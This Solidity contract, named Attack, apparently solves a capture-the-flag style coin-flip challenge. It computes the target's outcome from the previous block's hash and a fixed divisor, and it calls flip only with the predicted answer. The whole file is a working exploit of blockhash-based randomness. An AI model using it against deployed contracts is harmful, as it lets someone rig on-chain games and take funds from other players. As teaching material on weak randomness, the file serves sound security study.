// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);

    function consecutiveWins() external view returns (uint256);
}

error Attack__FalseGuess();

contract Attack {
    ICoinFlip private immutable coin;
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address contractAddress) {
        coin = ICoinFlip(contractAddress);
    }

    function start() public {
        bool side = _guess();
        if (!coin.flip(side)) {
            revert Attack__FalseGuess();
        }
    }

    function _guess() internal view returns (bool) {
        bool side = (uint256(blockhash(block.number - 1)) / FACTOR) == 1 ? true : false;
        return side;
    }

    function wins() external view returns (uint256) {
        return coin.consecutiveWins();
    }
}